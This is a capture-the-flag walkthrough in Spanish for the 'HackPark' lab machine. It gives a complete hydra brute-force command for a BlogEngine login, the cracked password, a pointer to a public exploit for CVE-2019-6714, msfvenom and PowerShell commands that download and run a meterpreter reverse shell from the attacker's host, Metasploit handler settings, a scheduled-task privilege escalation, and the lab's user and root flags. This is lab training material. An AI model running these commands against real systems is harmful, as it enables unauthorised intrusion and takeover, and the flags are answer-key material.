# HackPark - rmartinez 17/01/2022

IP: 10.10.146.142

## 1. Whats the name of the clown displayed on the homepage?

```
pennywise
```

El siguiente paso será bruteforcear con hydra el formulario que hay en /Account/login.aspx. Lo que haremos será abrir Burp para ver la payload que se envía en el formulario (http-payload.txt) y se la pasaremos a hydra para crackearla.

En hydra usando el módulo http-post-form la payload tiene la siguiente estructura:

```
"URL:FORM PAYLOAD:CONTENIDO RESPONSE QUE QUEREMOS EVITAR"
```


Bruterforceamos con hydra el login ejecutando el siguiente payload:

```
hydra -f -l admin -P /opt/wordlists/rockyou.txt 10.10.146.142 http-post-form "/Account/login.aspx?ReturnURL=%2fadmin%2f:__VIEWSTATE=fL2tVePaQj2Bd3yhP1Qk9latiwIWDWnmeUFI8PtMVR5gr%2F1V4bvoOons45qp6htzIzTkaeWDOTjzcGQESaMDqQ6sGcW5ALgtcoSI2hSGNhIA1%2FiNamYc4Trh06FVDrcB8mJluyZ7zLrLwhYkTh8YXwp0kVl8sx%2Fz09DWvfTMiijwtsJO&__EVENTVALIDATION=0fEbnWaJiLKupaIpmuCSVPWoeRsXc2Cug9TGKwz7aK0xT%2FHQzApBSH1p7%2Faq4%2FYnVt408khIpV0Z0T%2BKSpepvkGqEh2laoN2m5ElUU9qXkUUvbOEKnsElaIbLgjglRMUJKb5d9w8QmbVpx1Gzas4QfrR%2FABP6AXUzBMN9TOOUdDCUjh2&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Iniciar+sesi%C3%B3n:Login failed"

```
Nos da el siguiente output positivo:
```
[80][http-post-form] host: 10.10.146.142   login: admin   password: 1qaz2wsx
```

Lo siguiente que haremos para obtener acceso a la máquina será comprobar qué estamos comprometiendo. En este caso, se trata de BlogEngine 3.3.6.0, que comprobaremos en la página de about.

Buscaremos un exploit y veremos que esta máquina es vulnerable a la **CVE-2019-6714**. Usaremos el exploit público en:
```
https://www.exploit-db.com/exploits/46353
```

Seteamos IP y puerto y abrimos un listener de netcat en el 4444. Nos da una revshell roñosa de cmd. 

Lo que haremos a continuación es subirnos una shell de meterpreter con powershell:

```
mkdir webserver
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.9.3.241 LPORT=5555 -f exe -o shell.exe
python -m http.server
powershell -c "Invoke-WebRequest -Uri 'http://10.9.3.241:8000/shellaca2.exe' -OutFile 'C:\Windows\Temp\shell2.exe'"
powershell -c "Start-Process 'C:\Windows\Temp\shell.exe'"
```

En metasploit:

```
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.9.3.241
set LPORT 5555
run
```




Ya tenemos la shell de meterpreter. Con meterpreter o no, bajamos winpeas y lo ejecutamos. Listamos los servicios y vemos uno que nos llama la atención 
```
WindowsScheduler
```
Vamos a la carpeta donde está alojado y vemos un log sospechoso en Events/20198415519.INI_LOG.txt

Lo abrimos y vemos que cada minuto se está ejecutando un ejecutable llamado Message.exe con el usuario Administrator.

Nos vamos a esa ubicación y creamos una reverse shell nueva con msfvenom igual que antes.

Nos bajamos la revshell, la ejecutamos, y gg pwn3d.

User flag: 759bd8af507517bcfaede78a21a73e39
<br>
Root flag: 7e13d97f05f7ceb9881a3eb3d78d3e72

